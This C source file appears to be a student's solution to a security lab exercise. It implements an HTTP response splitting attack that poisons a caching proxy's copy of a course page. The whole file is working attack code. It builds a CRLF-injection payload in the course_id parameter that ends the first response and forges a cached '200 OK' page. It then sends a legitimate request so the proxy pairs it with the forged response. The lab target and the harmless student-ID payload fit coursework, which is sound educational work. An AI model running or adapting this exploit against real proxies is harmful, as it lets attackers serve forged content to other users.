#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Proxy IP
#define TARGET_IP "192.168.1.202"
#define TARGET_PORT 8080
// ID
#define STUDENT_ID "207777020"
// The Genuine Page we want to poison
#define TARGET_PAGE "/67607.html"

// --- PAYLOAD CONSTRUCTION ---
// 1. We inject into 'course_id' to split the response.
// 2. The first response (302) is terminated by our injected Content-Length: 0.
// 3. The second response (200 OK) is our "Poison" that gets cached.
// 4. Note: We use %0d%0a for \r\n and %20 for spaces. We have to embed these in the request line because the proxy ignores these but when
//          sends to the web server, it decodes the embedded characters such as %0d%0a as /r/n and then that's why the attack works.
#define MALICIOUS_PAYLOAD \
    "GET /cgi-bin/course_selector?course_id=67607" \
    "%0d%0a" /* --- INJECTION START --- */ \
    "Content-Length:%200" \
    "%0d%0a%0d%0a" /* --- END OF 1st RESPONSE --- */ \
    \
    "HTTP/1.1%20200%20OK" /* --- START OF 2nd RESPONSE (Poison) --- */ \
    "%0d%0a" \
    "Content-Type:%20text/html" \
    "%0d%0a" \
    "Last-Modified:%20Sat,%2010%20Jan%202026%2012:00:00%20GMT" /* Last-Modified: January 10, 2026 */ \
    "%0d%0a" \
    "Content-Length:%2022" /* Length of <HTML>207777020</HTML> */ \
    "%0d%0a" \
    "%0d%0a" \
    "<HTML>" STUDENT_ID "</HTML>" \
    " HTTP/1.1\r\n" \
    "Host: " TARGET_IP "\r\n" \
    "Connection: keep-alive\r\n" \
    "\r\n"

// The innocent request that the Proxy will pair with the Poisoned Response
#define LEGITIMATE_REQUEST \
    "GET " TARGET_PAGE " HTTP/1.1\r\n" \
    "Host: " TARGET_IP "\r\n" \
    "Connection: keep-alive\r\n" \
    "\r\n"

void consume_first_response(int sockfd) {
  char buffer[1];
  int newline_count = 0;

  // We expect the first response (302) to have Content-Length: 0 (because we injected it).
  // So we just need to read until the headers end (\r\n\r\n).
  while (recv(sockfd, buffer, 1, 0) > 0) {
    if (buffer[0] == '\n') {
      newline_count++;
    } else if (buffer[0] != '\r') {
      newline_count = 0;
    }
    if (newline_count == 2) break; // Found \r\n\r\n
  }
}

int main() {
  int sockfd;
  struct sockaddr_in server_addr;
  char buffer[4096];

  // 1. Create Socket
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    exit(1);
  }

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(TARGET_PORT);
  if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
    exit(1);
  }

  // 2. Connect to Proxy
  if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    exit(1);
  }

  // 3. Send Malicious Request
  // This sends one packet containing the split payload.
  if (send(sockfd, MALICIOUS_PAYLOAD, strlen(MALICIOUS_PAYLOAD), 0) < 0) {
    exit(1);
  }

  // 4. Consume the 1st Response
  consume_first_response(sockfd);

  // 5. Send Legitimate Request
  // The Proxy currently has the poisoned "200 OK" sitting in its buffer.
  if (send(sockfd, LEGITIMATE_REQUEST, strlen(LEGITIMATE_REQUEST), 0) < 0) {
    exit(1);
  }

  // 6. Verification
  memset(buffer, 0, sizeof(buffer));
  if (recv(sockfd, buffer, sizeof(buffer) - 1, 0) < 0) {
    close(sockfd);
    exit(1);
  }
  close(sockfd);
  return 0;
}